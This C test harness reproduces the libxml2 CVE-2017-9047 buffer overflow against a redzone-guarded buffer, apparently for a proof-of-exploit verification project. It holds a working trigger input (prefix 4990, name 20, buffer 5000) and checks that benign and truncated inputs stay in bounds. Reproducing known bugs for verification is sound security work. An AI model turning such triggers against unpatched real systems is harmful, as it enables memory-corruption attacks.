/*
 * Native reproduction self-test for target #4
 * (04-libxml2-cve-2017-9047-upstream.c).
 *
 * This is the Phase-1 (target-fidelity) validation that does NOT need
 * the SP1 proving stack: it links the SAME freestanding `zkpox_victim`
 * the guest links, drops it into a redzone-guarded buffer shaped like
 * `zkpox_predicates::redzone::scan_around` (leading + buffer + trailing
 * 0xA5 fill), and confirms that the VERBATIM upstream
 * xmlSnprintfElementContent writes past the buffer end on the
 * CVE-2017-9047 path — and does NOT on a benign input.
 *
 * Build + run via tests/run-realsource-repro.sh. Exit 0 = all cases
 * matched expectations.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* The single symbol the target exposes (matches the guest's extern). */
extern char zkpox_victim(char *buf, size_t buf_size,
                         const char *input, size_t n);

/* Mirror redzone.rs geometry. */
#define LEADING 16
#define UNIFORM_CANARY 0xA5

typedef struct {
    int dirty;
    unsigned long count;
    long first_offset; /* LONG_MIN-ish sentinel = -1 here for "none" */
} scan_t;

/*
 * Run zkpox_victim against a 0xA5-filled window and scan everything
 * OUTSIDE [LEADING, LEADING+buf_size) for changes — exactly what the
 * Rust redzone scanner does, minus the position-varying pattern (a
 * uniform canary is enough to demonstrate the write; the name bytes we
 * feed are never 0xA5).
 */
static scan_t run_case(size_t buf_size, const unsigned char *witness, size_t n)
{
    size_t trailing = 64;
    if (n > buf_size && n - buf_size + 8 > trailing) {
        trailing = n - buf_size + 8;
    }
    size_t total = LEADING + buf_size + trailing;
    unsigned char *window = malloc(total);
    memset(window, UNIFORM_CANARY, total);

    char *buf = (char *)(window + LEADING);
    zkpox_victim(buf, buf_size, (const char *)witness, n);

    scan_t s = { 0, 0, -1 };
    for (size_t i = 0; i < total; i++) {
        if (i >= LEADING && i < LEADING + buf_size) {
            continue; /* inside the legitimate buffer */
        }
        if (window[i] != UNIFORM_CANARY) {
            s.dirty = 1;
            s.count++;
            if (s.first_offset < 0) {
                s.first_offset = (long)i - (long)LEADING;
            }
        }
    }
    free(window);
    return s;
}

/* Encode a witness: u16 LE prefix_len, u16 LE name_len, prefix, name. */
static size_t encode(unsigned char *out, size_t cap,
                     unsigned prefix_len, unsigned char prefix_byte,
                     unsigned name_len, unsigned char name_byte)
{
    size_t n = 4 + prefix_len + name_len;
    if (n > cap) {
        fprintf(stderr, "witness buffer too small\n");
        exit(3);
    }
    out[0] = prefix_len & 0xff;
    out[1] = (prefix_len >> 8) & 0xff;
    out[2] = name_len & 0xff;
    out[3] = (name_len >> 8) & 0xff;
    memset(out + 4, prefix_byte, prefix_len);
    memset(out + 4 + prefix_len, name_byte, name_len);
    return n;
}

int main(void)
{
    static unsigned char witness[8192];
    int failures = 0;

    /* Case 1: the CVE trigger. buf_size 5000 (real caller geometry),
     * prefix 4990 nearly fills it, name 20 overflows via the stale len.
     * Expect a write past the buffer end starting at offset 0. */
    {
        size_t n = encode(witness, sizeof witness, 4990, 'A', 20, 'B');
        scan_t s = run_case(5000, witness, n);
        printf("trigger  (prefix=4990 name=20 buf=5000): dirty=%d count=%lu first_offset=%ld\n",
               s.dirty, s.count, s.first_offset);
        /* The redzone scanner reports first_offset = index - LEADING, so
         * the first byte past the buffer is at offset == buf_size. */
        if (!s.dirty || s.first_offset != 5000) {
            printf("  FAIL: expected an OOB write starting at offset buf_size (5000)\n");
            failures++;
        } else {
            printf("  ok: CVE-2017-9047 reproduces on the verbatim function\n");
        }
    }

    /* Case 2: benign. Short prefix/name, buffer nowhere near full, so
     * the (correct or stale) length check keeps the writes in-bounds. */
    {
        size_t n = encode(witness, sizeof witness, 10, 'A', 5, 'B');
        scan_t s = run_case(5000, witness, n);
        printf("benign   (prefix=10   name=5  buf=5000): dirty=%d count=%lu\n",
               s.dirty, s.count);
        if (s.dirty) {
            printf("  FAIL: benign input must not write out of bounds\n");
            failures++;
        } else {
            printf("  ok: benign input stays in bounds\n");
        }
    }

    /* Case 3: truncated witness (n < declared lengths) is a no-op. */
    {
        unsigned char w[4] = { 0xff, 0x13, 0x14, 0x00 }; /* claims big lens, no data */
        scan_t s = run_case(5000, w, sizeof w);
        printf("noop     (truncated witness):            dirty=%d\n", s.dirty);
        if (s.dirty) {
            printf("  FAIL: truncated witness must not write out of bounds\n");
            failures++;
        } else {
            printf("  ok: truncated witness rejected before the bug\n");
        }
    }

    if (failures) {
        printf("\n%d case(s) FAILED\n", failures);
        return 1;
    }
    printf("\nall cases passed\n");
    return 0;
}
